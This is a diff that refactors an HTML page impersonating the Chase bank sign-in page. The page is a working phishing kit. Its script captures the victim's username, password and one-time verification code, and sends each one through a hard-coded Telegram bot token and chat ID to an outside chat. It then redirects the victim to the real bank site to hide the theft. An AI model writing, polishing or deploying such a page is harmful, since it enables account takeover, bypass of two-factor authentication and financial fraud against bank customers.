@@ -5,102 +5,197 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chase - Sign In</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: Arial, Helvetica, sans-serif; background: #f7f7f7; }
-.header { background: #0b5cab; padding: 15px 20px; }
-.header img { width: 120px; }
-.container { max-width: 400px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px
-10px rgba(0,0,0,0.1); }
-.logo-row { text-align: center; margin-bottom: 20px; }
-.logo-row img { width: 150px; }
-h2 { color: #0b5cab; font-size: 22px; margin-bottom: 10px; text-align: center; }
-p.subtitle { color: #555; font-size: 14px; margin-bottom: 20px; text-align: center; }
-label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; font-size: 14px; }
-input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px;
-font-size: 16px; margin-bottom: 15px; }
-input:focus { outline: none; border-color: #0b5cab; }
-button { width: 100%; background: #0b5cab; color: #fff; border: none; padding: 14px; border-radius: 4px; font-size: 16px;
-cursor: pointer; font-weight: bold; }
-button:hover { background: #084a8f; }
-.helper-text { font-size: 12px; color: #777; margin-top: 15px; text-align: center; }
-.error { color: #c00; margin-top: 10px; text-align: center; }
-#step2 { display: none; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: Arial, Helvetica, sans-serif; background: #f7f7f7; }
+  .header {
+    background: #0b5cab;
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+  }
+  .header .logo {
+    display: flex;
+    align-items: center;
+  }
+  .header .logo svg {
+    width: 32px;
+    height: 32px;
+    margin-right: 8px;
+  }
+  .header .logo-text {
+    color: #ffffff;
+    font-size: 20px;
+    font-weight: bold;
+    letter-spacing: 0.5px;
+  }
+  .container {
+    max-width: 400px;
+    margin: 40px auto;
+    background: #fff;
+    padding: 30px 25px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  }
+  .logo-row {
+    text-align: center;
+    margin-bottom: 15px;
+  }
+  .logo-row svg {
+    width: 80px;
+    height: 80px;
+  }
+  h2 {
+    color: #0b5cab;
+    font-size: 22px;
+    margin-bottom: 10px;
+    text-align: center;
+    font-weight: normal;
+  }
+  p.subtitle {
+    color: #555;
+    font-size: 14px;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+  label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 5px;
+    color: #333;
+    font-size: 14px;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 16px;
+    margin-bottom: 15px;
+    outline: none;
+  }
+  input:focus {
+    border-color: #0b5cab;
+  }
+  button {
+    width: 100%;
+    background: #0b5cab;
+    color: #fff;
+    border: none;
+    padding: 14px;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+  button:hover {
+    background: #084a8f;
+  }
+  .helper-text {
+    font-size: 12px;
+    color: #777;
+    margin-top: 15px;
+    text-align: center;
+  }
+  .helper-text a {
+    color: #0b5cab;
+    text-decoration: none;
+  }
+  .error {
+    color: #c00;
+    margin-top: 10px;
+    text-align: center;
+  }
+  #step2 { display: none; }
 </style>
 </head>
 <body>
-<div class="header" style="background:#0b5cab; padding:10px 20px; display:flex; align-items:center;
-justify-content:center;">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" style="margin-right:10px;">
-        <polygon points="100,5 165,35 165,100 100,135 35,100 35,35" fill="#ffffff"/>
-        <text x="100" y="122" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#0b5cab"
+
+<!-- Header with Chase logo -->
+<div class="header">
+  <div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
+      <polygon points="100,5 165,35 165,100 100,135 35,100 35,35" fill="#ffffff"/>
+      <text x="100" y="122" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#0b5cab"
 text-anchor="middle">CHASE</text>
     </svg>
-    <span style="color:#ffffff; font-family:Arial, sans-serif; font-size:22px; font-weight:bold;">CHASE</span>
+    <span class="logo-text">CHASE</span>
+  </div>
 </div>
-20px;">
-  <polygon points="100,5 165,35 165,100 100,135 35,100 35,35" fill="#0b5cab"/>
-  <text x="100" y="115" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="#ffffff"
-text-anchor="middle">CHASE</text>
-</svg>
-</div>
+
+<!-- Step 1: Username and Password -->
 <div class="container" id="step1">
-    <h2>Sign in to your account</h2>
-    <p class="subtitle">Enter your username and password</p>
-    <form id="loginForm">
-        <label for="username">Username</label>
-        <input type="text" id="username" name="username" autocomplete="off" required>
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" autocomplete="off" required>
-        <button type="submit">Sign in</button>
-        <div class="error" id="errorMsg"></div>
-    </form>
-    <p class="helper-text">New to Chase? <a href="https://www.chase.com" style="color:#0b5cab;">Enroll now</a></p>
+  <div class="logo-row">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
+      <polygon points="100,5 165,35 165,100 100,135 35,100 35,35" fill="#0b5cab"/>
+      <text x="100" y="122" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#ffffff"
+text-anchor="middle">CHASE</text>
+    </svg>
+  </div>
+  <h2>Sign in to your account</h2>
+  <p class="subtitle">Enter your username and password</p>
+  <form id="loginForm">
+    <label for="username">Username</label>
+    <input type="text" id="username" name="username" autocomplete="off" required>
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" autocomplete="off" required>
+    <button type="submit">Sign in</button>
+    <div class="error" id="errorMsg"></div>
+  </form>
+  <p class="helper-text">
+    <a href="#">Forgot username?</a> &nbsp;|&nbsp; <a href="#">Forgot password?</a><br>
+    New to Chase? <a href="https://www.chase.com">Enroll now</a>
+  </p>
 </div>
+
+<!-- Step 2: OTP Verification -->
 <div class="container" id="step2">
-    <h2>Verify your identity</h2>
-    <p class="subtitle">We sent a verification code to your phone</p>
-    <form id="otpForm">
-        <label for="otp">Enter code</label>
-        <input type="text" id="otp" name="otp" inputmode="numeric" maxlength="6" autocomplete="off" required>
-        <button type="submit">Verify</button>
-        <div class="error" id="otpError"></div>
-    </form>
-    <p class="helper-text">Didn't receive a code? <a href="#" style="color:#0b5cab;">Resend code</a></p>
+  <h2>Verify your identity</h2>
+  <p class="subtitle">We sent a verification code to your phone</p>
+  <form id="otpForm">
+    <label for="otp">Enter code</label>
+    <input type="text" id="otp" name="otp" inputmode="numeric" maxlength="6" autocomplete="off" required>
+    <button type="submit">Verify</button>
+    <div class="error" id="otpError"></div>
+  </form>
+  <p class="helper-text">Didn't receive a code? <a href="#">Resend code</a></p>
 </div>
+
 <script>
 const botToken = '8610254587:AAEXZL1gK86eJeKk_N5VnI8NNaTLZD96E6E';
 const chatId = '6263246736';
 
 function sendTelegram(text) {
-    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: text })
-    });
+  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: text })
+  });
 }
 
 document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const user = document.getElementById('username').value;
-    const pass = document.getElementById('password').value;
-    const msg = `CHASE LOGIN\nUser: ${user}\nPass: ${pass}`;
-    sendTelegram(msg).then(() => {
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }).catch(() => {
-        document.getElementById('errorMsg').textContent = 'Connection error. Please try again.';
-    });
+  e.preventDefault();
+  const user = document.getElementById('username').value;
+  const pass = document.getElementById('password').value;
+  const msg = `CHASE LOGIN\nUser: ${user}\nPass: ${pass}`;
+  sendTelegram(msg).then(() => {
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  }).catch(() => {
+    document.getElementById('errorMsg').textContent = 'Connection error. Please try again.';
+  });
 });
 
 document.getElementById('otpForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const code = document.getElementById('otp').value;
-    const msg = `CHASE OTP CODE: ${code}`;
-    sendTelegram(msg).then(() => {
-        window.location.href = 'https://www.chase.com';
-    }).catch(() => {
-        document.getElementById('otpError').textContent = 'Invalid code. Please try again.';
-    });
+  e.preventDefault();
+  const code = document.getElementById('otp').value;
+  const msg = `CHASE OTP CODE: ${code}`;
+  sendTelegram(msg).then(() => {
+    window.location.href = 'https://www.chase.com';
+  }).catch(() => {
+    document.getElementById('otpError').textContent = 'Invalid code. Please try again.';
+  });
 });
 </script>
 </body>
